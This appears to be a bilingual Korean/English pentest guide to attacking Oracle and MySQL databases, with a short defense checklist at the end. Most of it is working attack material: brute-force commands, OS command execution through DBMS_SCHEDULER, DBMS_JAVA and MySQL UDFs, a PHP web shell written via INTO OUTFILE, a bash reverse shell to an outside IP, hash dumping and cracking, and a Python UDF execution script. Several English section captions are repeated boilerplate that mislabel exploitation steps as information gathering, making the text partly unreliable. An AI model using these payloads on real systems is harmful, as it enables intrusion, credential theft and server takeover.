> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# Oracle / MySQL 공격 기법

## 0. 초보자를 위한 개념 이해

### 데이터베이스 해킹이란?

**데이터베이스(DB) 해킹**은 데이터베이스 시스템에 무단으로 접근하거나, SQL 인젝션 등의 기법을 통해 데이터를 탈취하거나 시스템을 장악하는 공격입니다.

```
데이터베이스가 공격자에게 매력적인 이유:
  ✓ 모든 중요 데이터가 집중됨
    (고객 정보, 금융 데이터, 자격증명, 비밀번호)
  ✓ 웹 애플리케이션과 직접 연결됨
    (SQLi 공격으로 우회 가능)
  ✓ 파일 읽기/쓰기 기능으로 OS 접근 가능
    (MySQL의 LOAD_FILE, INTO OUTFILE)
  ✓ 저장 프로시저로 OS 명령 실행 가능
    (MSSQL의 xp_cmdshell)
```

### SQL 인젝션 기초 (꼭 알아야 할 개념)

**SQL 인젝션(SQLi)**은 사용자 입력이 SQL 쿼리에 직접 포함될 때 발생하는 취약점입니다.

```
취약한 코드 (PHP 예시):
  $query = "SELECT * FROM users WHERE name = '" + $_GET['name'] + "'";
  
정상 입력: name = "홍길동"
  → SELECT * FROM users WHERE name = '홍길동'
  
공격 입력: name = "' OR '1'='1"
  → SELECT * FROM users WHERE name = '' OR '1'='1'
  → 조건이 항상 참 → 모든 사용자 반환!
  
공격 입력 2: name = "'; DROP TABLE users; --"
  → SELECT * FROM users WHERE name = ''; DROP TABLE users; --'
  → users 테이블 삭제!
```

### DB 해킹 공격 체인

```
1단계: 탐색
  - 웹 애플리케이션에서 SQLi 취약점 발견
  - 또는 직접 DB 포트 스캔 (1521, 3306, 1433, 5432)
  
2단계: 초기 접근
  - SQLi로 웹 앱 우회
  - 기본 계정/약한 비밀번호 (admin/admin, root/root)
  - 노출된 DB 포트에 직접 접속
  
3단계: 정보 수집
  - 데이터베이스 버전, 설치 경로
  - 테이블 목록, 컬럼 구조
  - 사용자 계정 및 권한
  
4단계: 데이터 탈취
  - 민감한 테이블에서 데이터 추출
  - 자격증명 해시 덤프 → 오프라인 크래킹

5단계: 권한 상승 (선택적)
  - 파일 읽기/쓰기로 웹쉘 업로드
  - OS 명령 실행으로 서버 장악
```

---

## 1. DB 해킹 개요

```
공격 진입 경로:
  웹 애플리케이션 → SQLi → DB 쉘
  네트워크 스캔   → 노출된 DB 포트 직접 접근
  크레덴셜 크랙   → 기본 계정/약한 비밀번호

기본 포트:
  Oracle    → 1521 (TNS Listener)
  MySQL     → 3306
  MSSQL     → 1433
  PostgreSQL → 5432
```

---

## 2. Oracle 공격

### 2-1. TNS Listener 스캔 및 SID 열거

```bash
# nmap으로 Oracle 탐지
nmap -sV -p 1521 --script oracle-tns-version <target>

# tnscmd10g로 SID 열거
tnscmd10g status -h <target>
tnscmd10g version -h <target>

# oscanner로 SID 자동 브루트포스
oscanner -s <target> -P 1521

# Metasploit SID 열거
msfconsole -q -x "use auxiliary/scanner/oracle/sid_enum; \
  set RHOSTS <target>; run"
```

### 2-2. Oracle 기본 계정 브루트포스

**Oracle 기본 계정 목록 (반드시 변경해야 함):**

```bash
# Metasploit Oracle 로그인 브루트포스
use auxiliary/scanner/oracle/oracle_login
set RHOSTS <target>
set SID ORCL
set USER_FILE /usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt
run

# hydra로 Oracle 브루트포스
hydra -L users.txt -P pass.txt <target> oracle-listener -s 1521 -S ORCL
```

```
Oracle 주요 기본 계정:
  sys       / change_on_install
  system    / manager
  scott     / tiger
  dbsnmp    / dbsnmp
  sysman    / sysman
  outln     / outln
```

### 2-3. Oracle SQLi → OS 명령 실행



```sql
-- UTL_FILE로 파일 읽기
SELECT UTL_FILE.GET_LINE(
  UTL_FILE.FOPEN('/etc', 'passwd', 'R'), 1
) FROM DUAL;

-- DBMS_SCHEDULER로 OS 명령 실행 (DBA 권한 필요)
BEGIN
  DBMS_SCHEDULER.CREATE_JOB(
    job_name   => 'PWNJOB',
    job_type   => 'EXECUTABLE',
    job_action => '/bin/bash',
    number_of_arguments => 2
  );
  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('PWNJOB', 1, '-c');
  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('PWNJOB', 2, 'id > /tmp/out.txt');
  DBMS_SCHEDULER.ENABLE('PWNJOB');
END;
/

-- Java로 OS 명령 실행 (Java 설치된 Oracle)
SELECT DBMS_JAVA.RUNJAVA(
  'oracle/aurora/util/Wrapper /bin/bash -c "id > /tmp/pwn.txt"'
) FROM DUAL;

-- 외부 프로시저를 통한 코드 실행 (extproc 활용)
-- TNS listener에서 extproc 로드 후 공유라이브러리 호출
```

### 2-4. Oracle 패스워드 해시 추출 및 크랙



```sql
-- Oracle 11g 이하 — DES 기반 해시
SELECT username, password FROM sys.user$ WHERE type# = 1;

-- Oracle 12c 이상 — SHA-512 기반
SELECT name, spare4 FROM sys.user$ WHERE type# = 1;
```

**Oracle 기본 계정 목록 (반드시 변경해야 함):**

```bash
# Hashcat으로 Oracle 11g 해시 크랙
# 형식: username:hash
hashcat -m 3100 oracle_hashes.txt rockyou.txt

# Oracle 12c (SHA-512 with salt)
hashcat -m 12300 oracle12_hashes.txt rockyou.txt
```

### 2-5. Oracle TNS Poison 공격

```
공격 원리:
  정상: 클라이언트 → TNS Listener (1521) → DB 서버
  공격: 클라이언트 → [공격자 MitM] → DB 서버

  TNS Listener가 외부에서 redirect 명령을 받아들이는 취약점 악용
  → 클라이언트 연결을 공격자 서버로 리다이렉트
  → 크레덴셜 가로채기

도구: tnspoisoning (Metasploit: auxiliary/admin/oracle/tnscmd)

패치: Oracle CPU 2012-01 이후 외부 redirect 차단
      Oracle 11.2.0.3+ 기본 차단
```

---

## 3. MySQL 공격

### MySQL 공격 개요

**MySQL을 공격하는 이유:**
```
MySQL은 세계에서 가장 널리 사용되는 오픈소스 DB
→ 많은 웹 앱이 MySQL과 연동됨
→ SQLi 취약점 → MySQL 접근 → OS 장악 가능

MySQL의 위험한 기능들:
  FILE 권한: LOAD_FILE(), INTO OUTFILE → 파일 시스템 접근
  UDF: 사용자 정의 함수 → OS 명령 실행
  Event/Trigger: 자동 실행 코드 → 지속성 확보
```

### 3-1. MySQL 정보 수집

**초기 접속 후 반드시 확인할 항목:**

```bash
# nmap MySQL 스캔
nmap -sV -p 3306 --script mysql-info,mysql-databases,mysql-users <target>

# MySQL 브루트포스
hydra -L users.txt -P pass.txt <target> mysql
nmap -p 3306 --script mysql-brute <target>
```

### 3-2. MySQL UDF(User Defined Function)를 통한 OS 명령 실행

**UDF란?** MySQL에서 C/C++로 만든 공유 라이브러리(.so/.dll)를 플러그인으로 등록해 SQL에서 사용자 정의 함수를 실행하는 기능입니다.

**공격 조건:**
```
필요 권한: FILE 권한 + INSERT 권한 (또는 DBA)
plugin_dir 쓰기 가능 여부 확인 필요
MySQL 서비스 계정 권한에 따라 OS 명령 실행 범위 달라짐
```

```sql
-- 1단계: UDF 공유 라이브러리 업로드
-- lib_mysqludf_sys.so 를 plugin 디렉토리에 업로드
SELECT @@plugin_dir;
-- /usr/lib/mysql/plugin/

-- INTO DUMPFILE로 바이너리 드롭
SELECT 0x7f454c46... INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';

-- 2단계: UDF 함수 등록
CREATE FUNCTION sys_exec RETURNS INT SONAME 'udf.so';
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.so';

-- 3단계: 명령 실행
SELECT sys_eval('id');
SELECT sys_eval('cat /etc/passwd');
SELECT sys_exec('bash -i >& /dev/tcp/10.10.10.1/4444 0>&1');
```

```python
import pymysql
import argparse
import base64
from pathlib import Path

def mysql_udf_exec(host: str, user: str, password: str, cmd: str) -> str:
    conn = pymysql.connect(host=host, user=user, password=password, db='mysql')
    cur = conn.cursor()

    cur.execute("SELECT @@plugin_dir")
    plugin_dir = cur.fetchone()[0]
    print(f"[*] Plugin dir: {plugin_dir}")

    cur.execute("SELECT sys_eval(%s)", (cmd,))
    result = cur.fetchone()
    cur.close()
    conn.close()
    return result[0] if result else ""

def main() -> None:
    parser = argparse.ArgumentParser(description="MySQL UDF 명령 실행")
    parser.add_argument("host")
    parser.add_argument("user")
    parser.add_argument("password")
    parser.add_argument("cmd")
    args = parser.parse_args()

    out = mysql_udf_exec(args.host, args.user, args.password, args.cmd)
    print(f"[+] 결과:\n{out}")

if __name__ == "__main__":
    main()
```

### 3-3. MySQL 파일 읽기/쓰기

**MySQL의 파일 접근 기능:**
```
LOAD_FILE(path):
  DB 서버의 파일 내용 읽기
  필요 조건: FILE 권한 + 파일이 world-readable
  
INTO OUTFILE / INTO DUMPFILE:
  쿼리 결과를 파일로 저장
  필요 조건: FILE 권한 + 대상 경로 쓰기 가능
  보안 설정: secure_file_priv 변수로 제한 가능
  
실제 공격 시나리오:
  SQLi 발견 → FILE 권한 있는 계정으로 접근 →
  웹 루트에 PHP 쉘 파일 쓰기 → 웹쉘로 OS 명령 실행
```

```sql
-- 파일 읽기 (FILE 권한 필요)
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/var/www/html/config.php');

-- 웹쉘 쓰기
SELECT '<?php system($_GET["cmd"]); ?>'
INTO OUTFILE '/var/www/html/shell.php';

-- secure_file_priv 우회 확인
SHOW VARIABLES LIKE 'secure_file_priv';
-- 빈 값이면 모든 경로 허용
```

### 3-4. MySQL 해시 추출 및 크랙

**MySQL 비밀번호 저장 방식의 변화:**
```
MySQL 4.x: MySQL323 (매우 약함, 짧은 해시)
MySQL 5.x: MySQL41 = SHA1(SHA1(password)) (더 안전)
MySQL 8.x: caching_sha2_password 또는 sha256_password
```

```sql
-- MySQL 5.x 이하
SELECT user, password FROM mysql.user;

-- MySQL 8.x (SHA-256 기반)
SELECT user, authentication_string FROM mysql.user;
```

**크래킹 명령어:**

```bash
# MySQL 4.x/5.x (MySQL323 / MySQL41 해시)
hashcat -m 200  mysql_hashes.txt rockyou.txt   # MySQL323
hashcat -m 300  mysql_hashes.txt rockyou.txt   # MySQL41 (SHA1*SHA1)

# MySQL 8.x (caching_sha2_password)
hashcat -m 7401 mysql_hashes.txt rockyou.txt
```

---

## 4. DB 공통 자동화 스캐너

```python
import socket
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed

DB_PORTS = {
    1521: "Oracle",
    3306: "MySQL",
    1433: "MSSQL",
    5432: "PostgreSQL",
    27017: "MongoDB",
    6379: "Redis",
    5984: "CouchDB",
}

def check_port(ip: str, port: int, timeout: float = 1.5) -> tuple[int, bool]:
    try:
        with socket.create_connection((ip, port), timeout=timeout):
            return port, True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return port, False

def scan_db_ports(target: str) -> None:
    print(f"[*] DB 포트 스캔: {target}")
    with ThreadPoolExecutor(max_workers=20) as ex:
        futures = {ex.submit(check_port, target, p): p for p in DB_PORTS}
        for f in as_completed(futures):
            port, open_ = f.result()
            if open_:
                db = DB_PORTS[port]
                print(f"  [OPEN] {port}/tcp — {db}")

def main() -> None:
    parser = argparse.ArgumentParser(description="DB 포트 스캐너")
    parser.add_argument("target", help="IP 또는 호스트명")
    args = parser.parse_args()
    scan_db_ports(args.target)

if __name__ == "__main__":
    main()
```

---

## 5. 방어 체크리스트

```
Oracle:
  □ 기본 계정(scott, dbsnmp, outln) 비활성화
  □ 외부 TNS redirect 차단 (VALID_NODE_CHECKING=YES)
  □ extproc 사용하지 않으면 비활성화
  □ UTL_FILE, UTL_TCP, UTL_HTTP 불필요 시 REVOKE
  □ 최신 CPU(Critical Patch Update) 적용

MySQL:
  □ root 계정 원격 접속 차단 (bind-address = 127.0.0.1)
  □ FILE, SUPER 권한 최소화
  □ secure_file_priv 설정 (특정 경로만 허용)
  □ UDF 플러그인 디렉토리 권한 강화
  □ 불필요 사용자 및 빈 패스워드 계정 제거

공통:
  □ DB 포트를 방화벽으로 제한 (앱서버 IP만 허용)
  □ DB 계정 최소권한 원칙 적용
  □ 쿼리 로깅 활성화 및 이상 탐지
  □ 패스워드 복잡도 정책 강제
```

---

<a name="english"></a>

# Oracle / MySQL Attack Techniques

## 1. Database Hacking Overview

```
Attack Entry Points:
  Web Application → SQLi → DB Shell
  Network Scan    → Direct access to exposed DB ports
  Credential Cracking → Default accounts / weak passwords

Default Ports:
  Oracle    → 1521 (TNS Listener)
  MySQL     → 3306
  MSSQL     → 1433
  PostgreSQL → 5432
```

---

## 2. Oracle Attacks

### 2-1. TNS Listener Scanning and SID Enumeration

```bash
# Detect Oracle with nmap
nmap -sV -p 1521 --script oracle-tns-version <target>

# Enumerate SIDs with tnscmd10g
tnscmd10g status -h <target>
tnscmd10g version -h <target>

# Auto-brute-force SIDs with oscanner
oscanner -s <target> -P 1521

# Metasploit SID enumeration
msfconsole -q -x "use auxiliary/scanner/oracle/sid_enum; \
  set RHOSTS <target>; run"
```

### 2-2. Oracle Default Account Brute Force

Commands to check Oracle database vulnerabilities. Verify TNS listener configuration and default account usage.

```bash
# Metasploit Oracle login brute force
use auxiliary/scanner/oracle/oracle_login
set RHOSTS <target>
set SID ORCL
set USER_FILE /usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt
run

# Brute force Oracle with hydra
hydra -L users.txt -P pass.txt <target> oracle-listener -s 1521 -S ORCL
```

```
Key Oracle Default Accounts:
  sys       / change_on_install
  system    / manager
  scott     / tiger
  dbsnmp    / dbsnmp
  sysman    / sysman
  outln     / outln
```

### 2-3. Oracle SQLi → OS Command Execution

SQL queries for database information gathering. Query user lists, granted privileges, and installed packages to analyze privilege escalation possibilities and attack paths.

```sql
-- Read files with UTL_FILE
SELECT UTL_FILE.GET_LINE(
  UTL_FILE.FOPEN('/etc', 'passwd', 'R'), 1
) FROM DUAL;

-- Execute OS commands with DBMS_SCHEDULER (requires DBA privileges)
BEGIN
  DBMS_SCHEDULER.CREATE_JOB(
    job_name   => 'PWNJOB',
    job_type   => 'EXECUTABLE',
    job_action => '/bin/bash',
    number_of_arguments => 2
  );
  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('PWNJOB', 1, '-c');
  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('PWNJOB', 2, 'id > /tmp/out.txt');
  DBMS_SCHEDULER.ENABLE('PWNJOB');
END;
/

-- Execute OS commands with Java (Java-enabled Oracle)
SELECT DBMS_JAVA.RUNJAVA(
  'oracle/aurora/util/Wrapper /bin/bash -c "id > /tmp/pwn.txt"'
) FROM DUAL;

-- Code execution via external procedures (using extproc)
-- Load extproc from TNS listener then call shared library
```

### 2-4. Oracle Password Hash Extraction and Cracking

SQL queries for database information gathering. Query user lists, granted privileges, and installed packages to analyze privilege escalation possibilities and attack paths.

```sql
-- Oracle 11g and below — DES-based hash
SELECT username, password FROM sys.user$ WHERE type# = 1;

-- Oracle 12c and above — SHA-512 based
SELECT name, spare4 FROM sys.user$ WHERE type# = 1;
```

Commands to check Oracle database vulnerabilities. Verify TNS listener configuration and default account usage.

```bash
# Crack Oracle 11g hashes with Hashcat
# Format: username:hash
hashcat -m 3100 oracle_hashes.txt rockyou.txt

# Oracle 12c (SHA-512 with salt)
hashcat -m 12300 oracle12_hashes.txt rockyou.txt
```

### 2-5. Oracle TNS Poison Attack

```
Attack Principle:
  Normal: Client → TNS Listener (1521) → DB Server
  Attack: Client → [Attacker MitM] → DB Server

  Exploits TNS Listener accepting redirect commands from external sources
  → Redirects client connections to attacker's server
  → Credential interception

Tool: tnspoisoning (Metasploit: auxiliary/admin/oracle/tnscmd)

Patch: External redirect blocked after Oracle CPU 2012-01
       Oracle 11.2.0.3+ blocks by default
```

---

## 3. MySQL Attacks

### 3-1. MySQL Information Gathering

Connect via MySQL client and gather basic information. Check `show databases`, `show grants`, `@@global.secure_file_priv`, etc. to assess file read/write privileges and data dump possibilities.

```bash
# nmap MySQL scan
nmap -sV -p 3306 --script mysql-info,mysql-databases,mysql-users <target>

# MySQL brute force
hydra -L users.txt -P pass.txt <target> mysql
nmap -p 3306 --script mysql-brute <target>
```

### 3-2. OS Command Execution via MySQL UDF (User Defined Function)

SQL queries for database information gathering. Query user lists, granted privileges, and installed packages to analyze privilege escalation possibilities and attack paths.

```sql
-- Step 1: Upload UDF shared library
-- Upload lib_mysqludf_sys.so to the plugin directory
SELECT @@plugin_dir;
-- /usr/lib/mysql/plugin/

-- Drop binary with INTO DUMPFILE
SELECT 0x7f454c46... INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';

-- Step 2: Register UDF functions
CREATE FUNCTION sys_exec RETURNS INT SONAME 'udf.so';
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.so';

-- Step 3: Execute commands
SELECT sys_eval('id');
SELECT sys_eval('cat /etc/passwd');
SELECT sys_exec('bash -i >& /dev/tcp/10.10.10.1/4444 0>&1');
```

```python
import pymysql
import argparse
import base64
from pathlib import Path

def mysql_udf_exec(host: str, user: str, password: str, cmd: str) -> str:
    conn = pymysql.connect(host=host, user=user, password=password, db='mysql')
    cur = conn.cursor()

    cur.execute("SELECT @@plugin_dir")
    plugin_dir = cur.fetchone()[0]
    print(f"[*] Plugin dir: {plugin_dir}")

    cur.execute("SELECT sys_eval(%s)", (cmd,))
    result = cur.fetchone()
    cur.close()
    conn.close()
    return result[0] if result else ""

def main() -> None:
    parser = argparse.ArgumentParser(description="MySQL UDF command execution")
    parser.add_argument("host")
    parser.add_argument("user")
    parser.add_argument("password")
    parser.add_argument("cmd")
    args = parser.parse_args()

    out = mysql_udf_exec(args.host, args.user, args.password, args.cmd)
    print(f"[+] Result:\n{out}")

if __name__ == "__main__":
    main()
```

### 3-3. MySQL File Read/Write

SQL queries for database information gathering. Query user lists, granted privileges, and installed packages to analyze privilege escalation possibilities and attack paths.

```sql
-- Read files (requires FILE privilege)
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/var/www/html/config.php');

-- Write web shell
SELECT '<?php system($_GET["cmd"]); ?>'
INTO OUTFILE '/var/www/html/shell.php';

-- Check secure_file_priv bypass
SHOW VARIABLES LIKE 'secure_file_priv';
-- Empty value means all paths are allowed
```

### 3-4. MySQL Hash Extraction and Cracking

SQL queries for database information gathering. Query user lists, granted privileges, and installed packages to analyze privilege escalation possibilities and attack paths.

```sql
-- MySQL 5.x and below
SELECT user, password FROM mysql.user;

-- MySQL 8.x (SHA-256 based)
SELECT user, authentication_string FROM mysql.user;
```

Check MySQL/MariaDB security configuration. Verify remote root access, empty password accounts, and unnecessary privileges.

```bash
# MySQL 4.x/5.x (MySQL323 / MySQL41 hashes)
hashcat -m 200  mysql_hashes.txt rockyou.txt   # MySQL323
hashcat -m 300  mysql_hashes.txt rockyou.txt   # MySQL41 (SHA1*SHA1)

# MySQL 8.x (caching_sha2_password)
hashcat -m 7401 mysql_hashes.txt rockyou.txt
```

---

## 4. Common DB Automated Scanner

```python
import socket
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed

DB_PORTS = {
    1521: "Oracle",
    3306: "MySQL",
    1433: "MSSQL",
    5432: "PostgreSQL",
    27017: "MongoDB",
    6379: "Redis",
    5984: "CouchDB",
}

def check_port(ip: str, port: int, timeout: float = 1.5) -> tuple[int, bool]:
    try:
        with socket.create_connection((ip, port), timeout=timeout):
            return port, True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return port, False

def scan_db_ports(target: str) -> None:
    print(f"[*] DB port scan: {target}")
    with ThreadPoolExecutor(max_workers=20) as ex:
        futures = {ex.submit(check_port, target, p): p for p in DB_PORTS}
        for f in as_completed(futures):
            port, open_ = f.result()
            if open_:
                db = DB_PORTS[port]
                print(f"  [OPEN] {port}/tcp — {db}")

def main() -> None:
    parser = argparse.ArgumentParser(description="DB port scanner")
    parser.add_argument("target", help="IP or hostname")
    args = parser.parse_args()
    scan_db_ports(args.target)

if __name__ == "__main__":
    main()
```

---

## 5. Defense Checklist

```
Oracle:
  □ Disable default accounts (scott, dbsnmp, outln)
  □ Block external TNS redirect (VALID_NODE_CHECKING=YES)
  □ Disable extproc if not in use
  □ REVOKE UTL_FILE, UTL_TCP, UTL_HTTP if unnecessary
  □ Apply latest CPU (Critical Patch Update)

MySQL:
  □ Block remote root access (bind-address = 127.0.0.1)
  □ Minimize FILE, SUPER privileges
  □ Configure secure_file_priv (allow only specific paths)
  □ Harden UDF plugin directory permissions
  □ Remove unnecessary users and empty-password accounts

Common:
  □ Restrict DB ports with firewall (allow only app server IPs)
  □ Apply principle of least privilege for DB accounts
  □ Enable query logging and anomaly detection
  □ Enforce password complexity policies
```
